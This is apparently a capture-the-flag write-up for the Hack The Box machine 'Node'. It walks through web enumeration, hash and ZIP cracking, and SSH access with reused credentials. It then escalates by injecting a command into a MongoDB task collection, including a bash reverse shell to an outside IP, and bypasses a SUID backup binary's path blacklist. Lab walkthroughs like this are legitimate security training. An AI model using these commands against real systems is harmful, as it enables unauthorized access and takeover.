# Node

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Topics** | Javascript, Apache Hadoop, Stored credentials MongoDB Enumeration Mongo Task Injection, Command Injection [User Pivoting] SUID Backup Binary Exploitation, Dynamic Analysis (1st way) SUID Backup Binary Exploitation, Pwnkit Pkexec (2nd way) |

---

## 📁 Folder Structure

- [`content/`](content/) — screenshots and inline references used in the write-up
- [`nmap/`](nmap/) — raw nmap output files
- [`exploit/`](exploit/) — exploit scripts, binaries, payloads, and other tools used

---

# Enumeration

## Nmap

SYN Scan

```bash
sudo nmap -sS -p- --open --min-rate 5000 -Pn -n -vvv -oN AllPorts 10.10.10.58 -oN AllPorts
```

Result:

```cpp
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63
```

TCP/Version Scan

```bash
nmap -p 22,3000 -sCV -Pn -n 10.10.10.58 -oN FullScanPorts
```

Result: 

```bash
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc5e34a625db43eceb40f4967b8ed1da (RSA)
|   256 6c8e5e5f4fd5417d1895d1dc2e3fe59c (ECDSA)
|_  256 d878b85d85ffad7be6e2b5da1e526236 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
|_http-title: MyPlace
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the initial scan we can see only 2 ports open, for now we will focus on port `3000` as we don’t have credentials for SSH (port 22). 

> SSH service is vulnerable to user enumeration. Check: `22 - Pentesting SSH Username Enumeration`
> 

Doing a simple search over internet for port 3000 and Apache Hadoop we will see that this service is used by multiple Javascript Applicatons, like NodeJS, Rocket Chat, etc. 

![Untitled](content/Untitled.png)

![Untitled](content/Untitled%201.png)

Now, let’s try to access the IP with the port 3000 via browser. 

![Untitled](content/Untitled%202.png)

It looks like the server is hosting some kind of webserver, if this is the case, we can fuzz this server to discover any interesting directory. 

Wfuzz Web Enumeration: 

```bash
wfuzz -c -t 200 --hc=404 --hw=249 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt http://10.10.10.58:3000/FUZZ
```

Result: 

```bash
Target: http://10.10.10.58:3000/FUZZ
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                    
=====================================================================

000000292:   301        9 L      15 W       171 Ch      "assets"                                                   
000000164:   301        9 L      15 W       173 Ch      "uploads"                                                  
000001480:   301        9 L      15 W       171 Ch      "vendor"
```

After fuzzing the directories we will see 3 interesting paths, however, if we try to access them, the server automatically redirect us to the main page, as we can see the response code is `300` which means that redirection is being applied. 

Let’s continue checking the webpage. We will see a option for `Login`, let’s click on that:

![Untitled](content/Untitled%203.png)

After trying with different SQL injections, it looks like the website is not vulnerable.

![Untitled](content/Untitled%204.png)

Let’s continue checking the content that is being retrived by using the browser inspector:

![Untitled](content/Untitled%205.png)

Checking the hearder of each one of the request we will an interesting file being requested, identified as `/api/users/latest`

![Untitled](content/Untitled%206.png)

List of users:

![Untitled](content/Untitled%207.png)

# Initial Access

After finding the `/api/users/latest` we will see the usernames and hashes that actually match what we saw earlier (Tom/Mark/Rastating), however, if we try to access `/api/users`we will see an additional user that seems to be an admin account identified as `myP14ceAdm1nAcc0uNT`

![Untitled](content/Untitled%208.png)

Using [crackstation](https://crackstation.net) we can proceed to crack those hashes:

![Untitled](content/Untitled%209.png)

Bingo!! We have some clear text credentials. 

Users:

```bash
myP14ceAdm1nAcc0uNT:manchester
tom:spongebob
mark:snowflake
```

Let’s try to log on using the admin account into the portal:

![Untitled](content/Untitled%2010.png)

Success!! Now, we will see a download to a backup file:

![Untitled](content/Untitled%2011.png)

After downloading the files and checking the content with `strings` we can see that file seems to be in base64 format. 

![Untitled](content/Untitled%2012.png)

![Untitled](content/Untitled%2013.png)

Let’s try to decode it and save it in another file:

```bash
cat myplace.backup | base64 -d > backup-myplace
```

Onced decoded, let’s see what kind of file are we facing:

![Untitled](content/Untitled%2014.png)

Based on this information, it looks like the file is a ZIP file. 

Let’s try unzip the file:

![Untitled](content/Untitled%2015.png)

However, it looks like the file is password protected, but we can easily crack the password using John the ripper.

First, convert/extract the hash to proper format for John the ripper, we use `zip2john` for this task.

```bash
zip2john backup.zip > hash_zip
```

![I’ve renamed the file to backup.zip](content/Untitled%2016.png)

I’ve renamed the file to backup.zip

Crack the password hash: (no wordlist or format is required to be passed)

```bash
sudo /opt/john/run/john hash_zip
```

![Untitled](content/Untitled%2017.png)

Bingo!!! We have the password for the ZIP file. 

ZIP File Password:

```bash
magicword
```

Let’s proceed to unzip the file.

![Untitled](content/Untitled%2018.png)

Looks like the content is part of the Website `MyPlace` which is the website hosted on port 3000.

This backup may containg sensible information stored in configuration files, so, let’s take a look at the files. Go to the root directory of the website, which is `myplace`

We will see the following files: 

![Untitled](content/Untitled%2019.png)

Let’s check the app.js file:

![Untitled](content/Untitled%2020.png)

At the top we can see some credentials for mongodb, however, we can’t access the mongodb service as the port is only accessible internally, however, this password may be reused on the system, so, let’s try to log in via SSH.

Credentials found: 

```bash
mark:5AYRft73VtFpc84k
```

Log via SSH:

```bash
ssh mark@10.10.10.58 
```

![Untitled](content/Untitled%2021.png)

Bingo!! We will have access as `Mark`user

![Untitled](content/Untitled%2022.png)

# Privilege Escalation

Let’s check the privileges assigned and groups:

![Untitled](content/Untitled%2023.png)

No relevant information or potential vectors for PE. 

Verify for any potential SUID assigned:

![Untitled](content/Untitled%2024.png)

We can see that PkExec has the SUID assigned, this is vulnerable to **`PwnKit: Local Privilege Escalation Vulnerability -** CVE-2021-4034`, however this is not the intended way, so, let’s continue analyzing the other SUID binaries. 

We can see the binary `/usr/local/bin/backup` which is not a common file or binary that can be found in Linux by default. 

Let’s check in detail:

![Untitled](content/Untitled%2025.png)

We can see the file is owned by root, but we also see that the group `admin` has the privileges to execute this binary. 

Let’s check who is part of the `admin` group:

First check which users are listed in `/home`

![Untitled](content/Untitled%2026.png)

We see users `frank, mark and tom`

Verify which groups each user belongs to:

- Frank:

![Untitled](content/Untitled%2027.png)

Looks like this user is not longer in the system. 

- Tom

![Untitled](content/Untitled%2028.png)

Bingo! We can see that `Tom` is currently part of the group `admin`, this means we need to switch to `tom`'s account in order to be able to execute the previous binary. 

Let’s check what processes are being executed as `Tom` user:

```bash
ps -aux | grep "Tom" 
```

![Untitled](content/Untitled%2029.png)

From the results we can see 2 interesting Javascript files being executed by process `node` under user `Tom`

```bash
/var/scheduler/app.js
/var/www/myplace/app.js
```

The second file (`/var/www/myplace/app.js`) seems to be the one associated with the website we saw at the beginning, so, let’s check only the first one (`/var/scheduler/app.js`):

Check permissions:

![Untitled](content/Untitled%2030.png)

Looks like we can only read the file but not write. 

Check the content:

```bash
mark@node:~$ cat /var/scheduler/app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

Based on the file configuration, we can see a function being executed on MongoDB, which connects to the resource `scheduler` and the collection `tasks` apparently and then performs a search for each document, if the file is found, then the doc is executed as a cmd command. 

To find out more information, let’s connect directly to mongodb from the compromised machine, as we have the user and password:

```bash
mongo -u mark -p 5AYRft73VtFpc84k scheduler 
```

Success!!

![Untitled](content/Untitled%2031.png)

Let’s check again the current DB:

![Untitled](content/Untitled%2032.png)

Let’s check the collections:

![Untitled](content/Untitled%2033.png)

We can see the collection name `tasks` .

> Note: Collections are like tables in SQL.
> 

To get the list documents in collection execute the following command

```bash
db.COLLECTION_NAME.find()
```

![Untitled](content/Untitled%2034.png)

However, it looks like there are no documents or data on this collection. 

At this point, let’s go back to the configuration of `app.js`, we will see the following instructions:

```bash
 if (!error && docs) { ---> Evaluates for any error and docs
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
```

The above code looks first for error and document into the collection, if the condition is true, then, the if portion is executed.

Then, the fuction checks for any document, if a document is found then it executes a console log which is basically a print, but also we can see that it executes the content of the document as a command, finally, the document is deleted according to the last instruction. 

Based on this information, let’s try to insert a command injection into the collection `tasks`, as we saw in the configuration, we can insert a cmd instruction:

To insert single document in selected collection execute the following command

```bash
db.COLLECTION_NAME.insert(document)
```

*Example:* 

![Untitled](content/Untitled%2035.png)

**Command Injection:**

```bash
db.tasks.insert({"cmd": "touch /tmp/test"})
```

![Untitled](content/Untitled%2036.png)

This instruction will basically create a test file in /tmp, if the instruction is executed, then we will have a potential  way to execute commands as `tom`

> Remember that `/var/scheduler/app.js` is running under user `Tom`
> 

Let’s check if the file was created: 

![Untitled](content/Untitled%2037.png)

Success! We can see that file `test` was created by user `Tom`

As we verified, we can execute commands as `Tom`, so, at this point what we can do is send us a reverse shell using using tom, just replace the code: 

```bash
db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.16.4/4443 0>&1'"})
```

Once executed, let’s configure a listener on our kali: 

![Untitled](content/Untitled%2038.png)

Success! We will get a reverse shell as `Tom` user. 

Now, we will be able to execute the binary `/usr/local/bin/backup` :

![Untitled](content/Untitled%2039.png)

Let’s check what is being executed a at low level using `ltrace`:

```bash
ltrace backup
```

First passing one argument:

![Untitled](content/Untitled%2040.png)

Nothing relevant.

Passing two arguments:

![Untitled](content/Untitled%2041.png)

Nothing relevant.

Passing three arguments: 

![Untitled](content/Untitled%2042.png)

Now we have response from the program. 

Based on this, we need to pass 3 arguments to the binary. 

Check the arguments we need using `ltrace` again: 

Let’s use as arguments `a, b, c` so we can diffenrentiate which argument is being compared:

```bash
ltrace /usr/local/bin/backup a b c 
```

Onced executed, we will see the argument `a` being compared against a `-q`, which means this is the argument we need to pass. 

![Untitled](content/Untitled%2043.png)

Execute again the command but this time passing the first argument as `-q` 

```bash
ltrace  /usr/local/bin/backup -q b c
```

Onced executed we will see a comparision for the argument `b` with what looks like a hash value:

![Untitled](content/Untitled%2044.png)

Actually, we see 3 different comparisions for `b` with 3 different hashes, also, noticed at the top that a file named `/etc/myplace/keys` is being opened with `Read` permissions. 

Let’s check the content of that file:

```bash
tom@node:/usr/local/bin$ cat /etc/myplace/keys                                                                               
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508                                                             
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474                                                             
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

Bingo, we will see 3 different hashes, which seem to be the same ones that the binary used for the comparision. 

Let’s pickup one and pass it as a second argument:

```bash
ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 c
```

Finally, let’s check the argument `c` to see what is being compared to:

![Untitled](content/Untitled%2045.png)

This time, it looks like the argument `c` is being compared against a directory or path, then, what is does is to make a ZIP (compress) the content of that directory and save it in `/tmp`

The zip file is also compressed with password protection, but we can see the password `magicword`

However, we can see that directories `/root` and `/etc/` are being compared, so, this may be an indicator of a blacklist.

But we can bypass this control by simply passing the directory without the slash `/` and making sure we are in that directory at the moment of the execution. 

```bash
#First move to root directory
cd /
#Then, execute the binary:
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
```

![Untitled](content/Untitled%2046.png)

Bingo! We will see the compressed file in base 64 format. 

Let’s copy the code and decode it:

```bash
echo 'UEsDBAoAAAAAAMRlEVUAAAAAAAAAAAAAAAAFABwAcm9vdC9VVAkAA//U/GJxZ...." | base64 -d > root.zip
```

Finally, unzip the file, remember the password `magicword` to decompress the file: 

![Untitled](content/Untitled%2047.png)

Success! Let’s check the content: 

![Untitled](content/Untitled%2048.png)

We will be able to see root’s flag. 

Reference MongoDB Commands:

[Basic commands for mongoDB](https://blog.e-zest.com/basic-commands-for-mongodb)

### Alternative way:

`**PwnKit: Local Privilege Escalation Vulnerability -** CVE-2021-4034` 

[Owned Node from Hack The Box!](https://www.hackthebox.com/achievement/machine/906667/110)